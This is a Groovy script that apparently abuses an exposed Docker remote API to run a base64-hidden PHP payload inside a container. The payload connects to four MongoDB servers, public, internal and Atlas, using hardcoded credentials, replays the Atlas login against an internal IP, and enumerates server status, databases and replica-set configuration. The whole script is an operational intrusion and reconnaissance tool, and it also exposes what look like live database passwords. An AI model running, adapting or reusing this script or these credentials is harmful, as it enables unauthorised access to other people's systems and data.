import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpCode = '''<?php
error_reporting(E_ALL & ~E_DEPRECATED);
function cmd($m, $db, $arr, $label) {
    try {
        $c = new MongoDB\\Driver\\Command($arr);
        $cur = $m->executeCommand($db, $c);
        $cur->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
        $r = $cur->toArray();
        echo "  [$label] OK\n";
        return $r[0];
    } catch (Exception $e) {
        echo "  [$label] FAIL: " . substr($e->getMessage(),0,200) . "\n";
        return null;
    }
}

function probeMongo($name, $uri) {
    echo "\\n========== $name ==========\\n";
    echo "URI: " . preg_replace('/:\\\\w+@/', ':***@', $uri) . "\\n";
    try {
        $m = new MongoDB\\Driver\\Manager($uri);
        echo "  [connect] OK\\n";
    } catch (Exception $e) {
        echo "  [connect] FAIL: " . substr($e->getMessage(),0,300) . "\\n";
        return;
    }

    $ism = cmd($m, 'admin', ['isMaster'=>1], 'isMaster');
    if ($ism) {
        echo "    hosts: " . json_encode(isset($ism['hosts'])?$ism['hosts']:(isset($ism['passives'])?$ism['passives']:null)) . "\\n";
        echo "    setName: " . (isset($ism['setName'])?$ism['setName']:'(none)') . " | msg: " . (isset($ism['msg'])?$ism['msg']:'') . "\\n";
        echo "    me: " . (isset($ism['me'])?$ism['me']:'?') . " | primary: " . (isset($ism['primary'])?$ism['primary']:'?') . "\\n";
        echo "    maxWireVersion: " . (isset($ism['maxWireVersion'])?$ism['maxWireVersion']:'?') . "\\n";
    }

    $bi = cmd($m, 'admin', ['buildInfo'=>1], 'buildInfo');
    if ($bi) echo "    version: " . $bi['version'] . " | git: " . (isset($bi['gitVersion'])?$bi['gitVersion']:'?') . "\\n";

    $ss = cmd($m, 'admin', ['serverStatus'=>1], 'serverStatus');
    if ($ss) {
        echo "    host: " . $ss['host'] . " | process: " . $ss['process'] . " | pid: " . $ss['pid'] . "\\n";
        echo "    uptime: " . $ss['uptime'] . "s | connections: " . json_encode($ss['connections']) . "\\n";
        if (isset($ss['repl'])) echo "    repl: " . json_encode($ss['repl']) . "\\n";
        if (isset($ss['sharding'])) echo "    sharding: " . json_encode($ss['sharding']) . "\\n";
    }

    $dbs = cmd($m, 'admin', ['listDatabases'=>1], 'listDatabases');
    if ($dbs && isset($dbs['databases'])) {
        foreach ($dbs['databases'] as $d) {
            echo "    DB: {$d['name']} (sizeOnDisk={$d['sizeOnDisk']}, empty=" . ($d['empty']?'1':'0') . ")\\n";
        }
    }

    cmd($m, 'admin', ['replSetGetConfig'=>1], 'rs.conf') && print("    rs.conf: " . json_encode(cmd($m,'admin',['replSetGetConfig'=>1],'x2')) . "\\n");
    $rsst = cmd($m, 'admin', ['replSetGetStatus'=>1], 'rs.status');
    if ($rsst && isset($rsst['members'])) {
        foreach ($rsst['members'] as $mb) {
            echo "    member: {$mb['name']} state={$mb['stateStr']} health={$mb['health']}\\n";
        }
    }
    cmd($m, 'admin', ['listShards'=>1], 'listShards');
    cmd($m, 'config', ['listCollections'=>1], 'config.listCollections');
}

// 1) Publica
probeMongo("PUBLICA t1envios (3.231.83.29:27017)",
    "mongodb://appt1envios:4Ap971EnvI0KI1@3.231.83.29:27017/tracking?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000");

// 2) Interna Sears
probeMongo("INTERNA sears (172.26.84.132:27021)",
    "mongodb://appsears:S34rSu64RD0Jhy63@172.26.84.132:27021/sears_tracking?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000");

// 3) Atlas via SRV (DNS interno puede overridear)
echo "\\n=== DNS SRV check (container) ===\\n";
$srv = @dns_get_record("_mongodb._tcp.t1envios.kqoop.mongodb.net", DNS_SRV);
echo "SRV: " . json_encode($srv) . "\\n";
$txt = @dns_get_record("t1envios.kqoop.mongodb.net", DNS_TXT);
echo "TXT: " . json_encode($txt) . "\\n";
$a = @dns_get_record("t1envios.kqoop.mongodb.net", DNS_A);
echo "A: " . json_encode($a) . "\\n";

probeMongo("ATLAS t1envios.kqoop.mongodb.net (srv)",
    "mongodb+srv://appmasivas_inb:nReyDxpQJXM0yvAYQTsa@t1envios.kqoop.mongodb.net/?connectTimeoutMS=8000&serverSelectionTimeoutMS=12000");

// 4) Atlas creds contra IP interna 172.27.141.24:27017 directo
probeMongo("ATLAS-IP-INTERNAL (172.27.141.24:27017)",
    "mongodb://appmasivas_inb:nReyDxpQJXM0yvAYQTsa@172.27.141.24:27017/admin?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000");
?>'''

def b64 = java.util.Base64.encoder.encodeToString(phpCode.getBytes("UTF-8"))
def url = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def conn = url.openConnection()
conn.setRequestMethod("POST"); conn.setDoOutput(true)
conn.setRequestProperty("Content-Type", "application/json")
def body = JsonOutput.toJson([AttachStdout:true, AttachStderr:true, Cmd:["bash","-c","echo ${b64} | base64 -d > /tmp/m3.php && php /tmp/m3.php"]])
conn.outputStream.write(body.bytes); conn.outputStream.flush()
def r = new JsonSlurper().parseText(conn.inputStream.text)
def eid = r.Id
def su = new URL("http://${dHost}:${dPort}/exec/${eid}/start").openConnection()
su.setRequestMethod("POST"); su.setDoOutput(true)
su.setRequestProperty("Content-Type", "application/json")
su.outputStream.write('{"Detach":false,"Tty":true}'.bytes); su.outputStream.flush()
println su.inputStream.text
